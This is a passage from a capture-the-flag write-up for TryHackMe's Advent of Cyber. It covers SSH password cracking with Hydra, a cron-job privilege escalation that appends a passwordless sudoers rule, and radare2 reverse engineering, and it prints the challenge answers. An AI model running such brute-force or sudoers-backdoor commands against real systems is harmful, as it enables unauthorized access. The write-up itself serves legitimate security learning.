   First thing to do is an nmap scan to find any open ports and running services te determine on which port ssh is running.
   
   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2020/CronJob_Nmap_Scan.png)

   ><details><summary>Click for answer</summary>4567</details>

2. Crack sam's password and read flag1.txt

   If Sam uses an easy password, logging into their account shouldn't be too difficult with Hydra. We can use the following command to have Hydra crack Sam's password.
   
   ```cmd
   hydra -l sam -P /usr/share/wordlists/ 10.10.72.36 ssh -t 4 -s 4567
   ```
   
   ![Hydra Crack](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2020/CronJob_Hydra_Crack.png)
   
   Now we can ssh into the machine and find the flag.
   
   ![SSH Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2020/CronJob_SSH_Login.png)
   
   ![First Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2020/CronJob_Flag1.png)

   ><details><summary>Click for answer</summary>THM{dec4389bc09669650f3479334532aeab}</details>

3. Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?

   Now we need to find out what cronjob is running and which it is executing. For this we can use `crontab -l`. Unfortunately, nothing is listed here. Neither does `cat /etc/crontab`. Lets try to use `find /home -name *sh` to find any scripts.
   
   ![Find Scripts](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2020/CronJob_Find_Scripts.png)
   
   Looks like a recurring task script to me. From the supplied website we found how to add a user to the list of sudoers. Add this to the script.
   
   ```cmd
   echo "sam ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
   ```
   
   ![Edit Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2020/CronJob_Edit_Script.png)
   
   Now we just have to wait a minute before we can continue. We can do a quick check to see if it working with `sudo -i` or `sudo -l`.
   
   To read the file we just need the following command `sudo cat /home/ubuntu/flag2.txt`.
   
   ![Flag 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2020/CronJob_Flag2.png)

   ><details><summary>Click for answer</summary>THM{b27d33705f97ba2e1f444ec2da5f5f61}</details>

### [Day 21] [Reverse Elf-ineering](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2021)

In this task we will take a look at reverse engineering binaries. We will use [Radare2](https://rada.re/n/radare2.html) for this. The supporting documentation can be found [here](https://drive.google.com/file/d/1maTcdquyqnZCIcJO7jLtt4cNHuRQuK4x/view?usp=sharing).

We will start by opening the file for debugging in Radare2 with the command: `r2 -d challenge1`. Then we tell the program to analyze the file and search for an entry point named main with `aa` and `afl | grep main`.

![R2 Opening](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2021/Reverse_Open_Analyze.png)

Now we can look at the assembly code by typing `pdf @main`.

![R2 Functions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2021/Reverse_Functions.png)

To answer the questions we can simply look through the code. But I will also do a check to see if we are correct by running the coding and inspecting the registers and memory. This is done by placing a breakpoint before the `mov eax` line.

```cmd
db 0x00400b69
```

Use `pdf @main` again to check the placement of the breakpoint (displayed as `b`). And `dc` to run the program up until the breakpoint.

![R2 Breakpoint](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2021/Reverse_Breakpoint.png)

1. What is the value of local_ch when its corresponding movl instruction is called(first if multiple)?

   On the third line we see that `1` is placed into the variable `var_ch`.
   
   To check, we symply type: `px @rbp-0xc` to view the variable.
   
   ![R2 Var ch](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2021/Reverse_Var_ch.png)

   ><details><summary>Click for answer</summary>1</details>

2. What is the value of eax when the imull instruction is called?

   On the fourth line the value 8 is placed in `var_8h`. On line five, `eax` is set as `1`. At the imull instruction, `eax` is multiplied by `var_8h`.
   
   To check we type `dr` to view the registers (rax=eax).
   
   ![R2 Eax](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2021/Reverse_Eax.png)

   ><details><summary>Click for answer</summary>6</details>

3. What is the value of local_4h before eax is set to 0?

   On the next line `var_4h` is set as `eax`.
   
   To check, we type: `px @rbp-0x4`.
   
   ![R2 Var 4h](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2021/Reverse_Var_4.png)

   ><details><summary>Click for answer</summary>6</details>

### [Day 22] [If Santa, Then Christmas](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/25daysofchristmas/Day%2022)

In this task we have a similar challenge only with an added if-statement in the code. The supporting documentation can be found [here](https://docs.google.com/document/d/1cIHd_YQ_PHhkUPMrEDWAIfQFb9M9ge3OFr22HHaHQOU/edit?usp=sharing).

Like the previous task, we will open the file for debugging, analyze it, and search for a main entry point.

![If Santa Opening](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2022/If_Santa_Open_Analyze.png)

Next we can look at the code with `pdf @main`.

![If Santa Code](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2022/If_Santa_Breakpoint.png)

1. what is the value of local_8h before the end of the main function?

   First, `var_8h` is set to `8` and `var_4h` is set to `2`. Then `eax` is set as `var_8h`.
   
   Then `if eax (8) is less or equal to var_4h (2): jump to [..]`. As this statement is false, it moves on to add `1` to `var_8h`. Then it jumps to the end.
   
   To check we set a breakpoint before the final instruction: `db 0x00400b71`. And check its value with: `px @rbp-0x8`.
   
   ![If Santa Var 8h](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2022/If_Santa_Var_8h.png)

   ><details><summary>Click for answer</summary>9</details>
   
2. what is the value of local_4h before the end of the main function?

   From the first question we see `var_4h` is set as `2` and is never changed before the end. 
   
   To check this we type: `px @rbp-0x4`.
   
   ![If Santa Var 8h](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2022/If_Santa_Var_4h.png)

   ><details><summary>Click for answer</summary>2</details>

### [Day 23] LapLANd (SQL Injection)



### [Day 24] Elf Stalk



### [Day 25] Challenge-less 


><details><summary>Click for answer</summary></details>
